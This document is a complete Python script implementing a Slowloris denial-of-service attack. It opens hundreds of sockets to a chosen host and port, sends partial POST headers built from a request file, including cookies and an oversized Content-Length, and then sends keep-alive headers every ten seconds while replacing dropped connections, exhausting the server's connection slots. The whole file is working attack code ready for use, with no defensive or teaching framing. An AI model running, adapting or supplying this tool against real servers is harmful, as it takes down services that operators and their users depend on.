#!/usr/bin/env python3
"""Slowloris — holds connection slots open by sending partial HTTP requests slowly."""
import socket
import time
import sys
import os

from request_loader import load_request_data, build_cookie_header

NUM_CONNECTIONS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
REQ = load_request_data()
TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else REQ["host"]
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else REQ["port"]


def create_socket(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))

        headers = f"POST {REQ['path']} HTTP/1.1\r\n"
        for k, v in REQ["headers"].items():
            headers += f"{k}: {v}\r\n"
        cookie_str = build_cookie_header(REQ["cookies"])
        if cookie_str and "Cookie" not in REQ["headers"]:
            headers += f"Cookie: {cookie_str}\r\n"
        headers += "Content-Length: 1000000\r\n"
        headers += "Content-Type: application/x-www-form-urlencoded\r\n"

        s.send(headers.encode())
        return s
    except Exception:
        return None


def main():
    print(f"[slowloris] Opening {NUM_CONNECTIONS} sockets to {TARGET_HOST}:{TARGET_PORT}", flush=True)
    print(f"[slowloris] Path: {REQ['path']} | Headers: {len(REQ['headers'])} | Cookies: {len(REQ['cookies'])}", flush=True)
    sockets = []
    for _ in range(NUM_CONNECTIONS):
        s = create_socket(TARGET_HOST, TARGET_PORT)
        if s:
            sockets.append(s)

    print(f"[slowloris] Holding {len(sockets)} connections open", flush=True)

    while True:
        dead = []
        for s in sockets:
            try:
                s.send(b"X-Pad: keep-alive\r\n")
            except Exception:
                dead.append(s)
        for s in dead:
            sockets.remove(s)
            new_s = create_socket(TARGET_HOST, TARGET_PORT)
            if new_s:
                sockets.append(new_s)

        if dead:
            print(f"[slowloris] Replaced {len(dead)} dead sockets, holding {len(sockets)}", flush=True)
        time.sleep(10)


if __name__ == "__main__":
    main()
